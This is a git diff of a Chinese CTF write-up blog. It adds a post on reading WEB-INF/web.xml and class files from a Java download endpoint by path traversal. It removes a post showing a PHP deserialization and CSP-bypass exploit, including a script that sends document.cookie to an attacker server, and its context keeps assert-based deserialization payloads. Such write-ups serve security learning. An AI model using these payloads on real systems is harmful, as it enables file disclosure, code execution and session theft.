@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,86 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-java的WEB-INF" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/30/java%E7%9A%84WEB-INF/" class="article-date">
+  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/30/java%E7%9A%84WEB-INF/">
+        java的WEB-INF
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="java的WEB-INF文件"><a href="#java的WEB-INF文件" class="headerlink" title="java的WEB-INF文件"></a>java的WEB-INF文件</h1><p>我们点击help，出现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
+<p>而且payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/Download?filename=文件名</span><br></pre></td></tr></table></figure>
+<p>可见可能是文件包含，可以用此下载文件，不过用get提交的方式不可以，所以此处我们可以试一下post提交，发现可以下载help.docx文件，而且用bp抓包，放到repeater后改为post提交，可以看见500状态码，即服务器内部出错，并爆出一些关键信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.NullPointerException</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:130)</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:93)</span><br><span class="line">	com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:661)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)</span><br><span class="line">	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/8.5.24&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>其中我们可以看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br></pre></td></tr></table></figure>
+<p>而一般我们出于安全的考虑，我们会将网页放在WEB-INF文件下，防止页面被直接访问，而要访问WEB-INF文件下的网页，在WEB-INF文件下设置web.xml文件，其中web.xml的格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--直接设置 welcome-file 节点--&gt;</span><br><span class="line">&lt;welcome-file&gt; ./WEB-INF/views/xxx.jsp&lt;/weclome-file&gt;</span><br></pre></td></tr></table></figure>
+<p>访问地址为：<a target="_blank" rel="noopener" href="http://url/xxx/%EF%BC%88xxx%E4%B8%BA%E9%A1%B9%E7%9B%AE%E5%90%8D%EF%BC%89">http://url/xxx/（xxx为项目名）</a></p>
+<p>因此，我们可以包含web.xml文件，即将help.docx改为web.xml进行post提交即可下载web.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt;</span><br><span class="line">&lt;welcome-file-list&gt;</span><br><span class="line">&lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class="line">&lt;/welcome-file-list&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+<p>通过看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br></pre></td></tr></table></figure>
+<p>可知FlagController.class文件放在WEB-INF/classes/com/wm/ctf/中</p>
+<p>WEB-INF主要包含的文件和目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+
+<p>所以可以和上面一样，包含FlagController.class文件，因此构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
+<p>即可得到，里面的base64的码就是flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-escapeshellarg和escapeshellcmd函数重过滤绕过" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -772,82 +852,6 @@
 <p>来输出，所以可以构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看flag文件名</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;)?scandir(&#x27;.&#x27;):&#x27;&#x27;&quot;;&#125;</span><br><span class="line"></span><br><span class="line">读flag文件</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).file_get_contents(&#x27;you_never_know_my_name&#x27;)&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-ssl数字证书" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/08/ssl%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/" class="article-date">
-  	<time datetime="2021-08-07T16:00:00.000Z" itemprop="datePublished">2021-08-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/ssl%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/">
-        SSL数字证书
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="SSL数字证书及原生类绕过"><a href="#SSL数字证书及原生类绕过" class="headerlink" title="SSL数字证书及原生类绕过"></a>SSL数字证书及原生类绕过</h1><p>通过F12查看源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&#x27;user&#x27;])&amp;&amp;!isset($_GET[&#x27;username&#x27;])&amp;&amp;!isset($_GET[&#x27;source&#x27;])&amp;&amp;!isset($_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: ./?username=guest&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$test=md5(uniqid(&#x27;&#x27;,true));</span><br><span class="line">header(&quot;Content-Security-Policy:  script-src &#x27;strict-dynamic&#x27; &#x27;nonce-$test&#x27;; img-src &#x27;self&#x27;; style-src &#x27;self&#x27;;  font-src &#x27;self&#x27;; frame-src &#x27;none&#x27; &quot;);</span><br><span class="line">header ( &quot;Cache-Control: no-cache, must-revalidate &quot; );</span><br><span class="line">function getCurrentUrl()&#123;</span><br><span class="line">    $scheme = $_SERVER[&#x27;REQUEST_SCHEME&#x27;];</span><br><span class="line">    $domain = $_SERVER[&#x27;HTTP_HOST&#x27;];</span><br><span class="line">    $requestUri = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">    $currentUrl = $scheme . &quot;://&quot; . $domain . $requestUri;</span><br><span class="line">    return $currentUrl;</span><br><span class="line">&#125;</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if (is_string($this-&gt;username))&#123;</span><br><span class="line">            if (preg_match(&#x27;/script|&lt;|&gt;|onload|onerror/i&#x27;,$this-&gt;username))&#123;</span><br><span class="line">                die(&#x27;no xss&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.htmlentities(&#x27;welcome back &#x27;.$this-&gt;username).&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.$this-&gt;username.&#x27;&amp;nbsp&amp;nbspis&amp;nbsp&amp;nbspnot&amp;nbsp&amp;nbspallowed,&amp;nbsp&amp;nbsponly&amp;nbsp&amp;nbspstring&#x27;.&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">            file_put_contents(&#x27;admin.log&#x27;,$_GET[&#x27;user&#x27;]);   //admin will check who attacks him in /admin.php</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">    $text=file_get_contents(__FILE__);</span><br><span class="line">    echo $text;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">    //drive bot to visit your page</span><br><span class="line">    //source code : browser.get(&#x27;http://127.0.0.1/?&#x27;+sys.argv[1])</span><br><span class="line">    //query example:</span><br><span class="line">    //your url : httP://127.0.0.1/?username=guest</span><br><span class="line">    //query : username=guest</span><br><span class="line">    $text=escapeshellarg($_GET[&#x27;query&#x27;]);</span><br><span class="line">    #echo($text);</span><br><span class="line">    system(&#x27;python /var/xssbot/xssbot.py &#x27;.$text);</span><br><span class="line">    //sleep(3);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;./css/stylesheet.css&#x27;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;&lt;!--?source=1--&gt;\n&quot;;</span><br><span class="line">echo &quot;&lt;body&gt;\n&quot;;</span><br><span class="line">if (isset($_GET[&#x27;user&#x27;]))&#123;</span><br><span class="line">    unserialize(urldecode(base64_decode($_GET[&#x27;user&#x27;])));</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_GET[&#x27;username&#x27;]))&#123;</span><br><span class="line">    echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.htmlentities(&#x27;hello &#x27;.$_GET[&#x27;username&#x27;]).&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;div id=&quot;particles-js&quot;&gt;&lt;/div&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/jquery-1.12.0.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/particles.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/app.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"> &quot;;</span><br><span class="line">echo &quot;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>通过对代码的审计，可知有两层的绕过，第一层是is_string()的绕过，可以使用原生类Exception()来绕过</p>
-<p>绕过第一层后，我们可以发现CSP(SSL数字证书）:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src&#x27;strict-dynamic&#x27;&#x27;nonce-$test&#x27;;</span><br></pre></td></tr></table></figure>
-<p>通过uniqid，nonce是不可知的，因此我们发现一串代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/jquery-1.12.0.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/particles.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/app.js&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>因此我们可以通过<base>修改自己的服务器的地址：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;//xx.xx.xx.xx:22222&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>结合起来，可以得到一个exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">&#125;</span><br><span class="line">$user=new user();</span><br><span class="line">$user-&gt;username=new Exception(&#x27;&lt;base href=&quot;//xx.xx.xx.xx:22222&quot;&gt;&#x27;);</span><br><span class="line">echo base64_encode(serialize($user));</span><br></pre></td></tr></table></figure>
-
-<p>然后我们利用ubuntu来创建一个./js/app.js文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-4-10-ubuntu:~# cat ./js/app.js </span><br><span class="line">window.open(&#x27;http://xx.xx.xx.xx:22222/&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>
-
-<p>构造payload为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=user=&lt;base64代码&gt;</span><br></pre></td></tr></table></figure>
-<p>我们可以得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] &quot;GET /js/particles.min.js HTTP/1.1&quot; 404 -</span><br><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] code 404, message File not found</span><br><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] &quot;GET /flag=ctfshow%7Bc4580781-d9de-449f-a8ec-f79c6464f037%7D%0A HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
       
     </div>
     
